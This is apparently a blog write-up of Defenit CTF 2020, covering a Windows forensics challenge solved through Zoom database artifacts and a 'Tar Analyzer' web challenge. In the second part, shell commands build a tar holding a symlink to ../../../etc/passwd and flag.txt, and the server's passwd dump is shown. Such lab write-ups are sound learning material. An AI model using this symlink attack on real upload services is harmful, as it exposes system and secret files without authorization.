---
layout: post
title: Defenit CTF 2020 Writeup
published: true
categories: [Web, Forensics]
---

I played with CTF.SG last weekend and we achieved 10th in the rankings although we didn't even solve a single pwn!

---

# Find Tangential Cipher

#### Category: Forensics | 3 solves | 857 points

We first-blooded this challenge thanks to my teammate Kenneth!

We are given a [Google Drive link](https://drive.google.com/drive/folders/1oQYvJnbOou5TUXaV1ApoQnP6S_Vj8pbI) with 9 files, named `Evidence.E01-8` and `Evidence.E01.txt`. The total file size is about 12 GB, so please check the link (if it is still alive) if  you want to try the challenge.

From the txt file, we can figure out that it's a physical image of a Windows system.

Opening up the image for browsing, we are greeted with different volumes. 

![Volume Partitions](/assets/defenit-2020/forensics/find-tangential-cipher/vol-partitions.png)

We tried them in order, starting from the first Basic data partition (vol 4) and finding that it's got nothing interesting.

![Volume 4](/assets/defenit-2020/forensics/find-tangential-cipher/vol-4-partition.png)

Moving on to the next basic data partition on vol 7, we find something we're much more acquainted with - the `C:\` Drive Windows Filesystem!

![Volume 7](/assets/defenit-2020/forensics/find-tangential-cipher/vol-7-partition.png)

Browsing around, we started with Appdata, going down the Default (skeleton) user and all the way down to `/User/secre` which seems to be the main user on this machine. We find many files, but nothing too interesting - until we reached the end of Appdata. There was this Zoom database where the `firstName:lastName` of a user was `man:suspect`.

![Zoom-Man-Suspect](/assets/defenit-2020/forensics/find-tangential-cipher/zoom-suspect-man.png)

We knew we were up to something now.

Moving on to the next db in the same folder, we found the message log in the first table of the db. As you can see in the image below, it goes like this:

![Zoom-Tangential-Hint](/assets/defenit-2020/forensics/find-tangential-cipher/zoom-tangential-file.png)

```
Hello
Long Time No See
We're dealing with weapons
I want you to go to the meeting place and get it yourself.
The Tangential Cipher is in the File.
Then, I'll ask you.
```

The next db file only showed the xmpp id, so we skipped that. 

However, going back to the first db in the folder, in the `zoom_mm_file` table, we found a `url` column that looked suspiciously like the `objkey` in a Zoom download link. 

![Zoom-File-ID](/assets/defenit-2020/forensics/find-tangential-cipher/zoom-file-id.png)

Putting that together into a link, we get a file shown below (I think `zfk` is my token so I'm not pasting the link here)

![Zoom-File-Binary](/assets/defenit-2020/forensics/find-tangential-cipher/zoom-file-binary.png)

As the table mentioned that it was a `Secret.docx` file, we use `curl -o flag.docx <URL>` to download it and open it in Microsoft Word.

And we got the flag!

![Flag](/assets/defenit-2020/forensics/find-tangential-cipher/flag.png)


<details>
  <summary>FLAG</summary>
  
  Mr_K_1_W@nT_Cola!!
</details>


---

# Tar Analyzer

#### Category: Web | 278 points

#### Description     
Our developer built simple web server for analyzing tar file and extracting online. He said server is super safe. Is it?

#### Server     
http://tar-analyzer.ctf.defenit.kr:8080/

#### Attachments    
[tar-analyzer.tar.gz](//github.com/Isopach/CTF-Writeup/blob/master/Defenit-2020/Web/Tar-Analyzer/tar-analyzer.tar.gz)

------------------------

We found the unintended solution for this.

Using the symbolic link vector, a common zip file unpacking vulnerability, we first tried to read the `/etc/passwd`.

```
ln -s ../../../etc/passwd aaa
tar -cvf test.tar aaa
```

This returns the `/etc/passwd` on the server as follows.

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
analyzer:x:1000:1000:Linux User,,,:/home/analyzer:
```

Hence we tried to guess the filename, starting with the common `flag.txt`.


```
ln -s ../../../flag.txt aaa
tar -cvf test.tar aaa
```

And done! We got the flag just like that.

<details>
  <summary>FLAG</summary>
  
  Defenit{R4ce_C0nd1710N_74r_5L1P_w17H_Y4ML_Rce!}
</details>

